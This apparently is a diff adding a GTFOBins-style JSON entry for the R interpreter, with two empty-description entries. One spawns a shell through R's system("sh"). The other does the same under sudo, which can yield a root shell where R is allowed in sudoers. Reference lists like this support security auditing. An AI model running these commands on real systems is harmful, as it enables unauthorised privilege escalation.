@@ -1,0 +1,16 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "description": "",
+        "code": "R --no-save -e 'system(\"sh\")'\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "",
+        "code": "sudo R --no-save -e 'system(\"sh\")'\n"
+      }
+    ]
+  }
+}
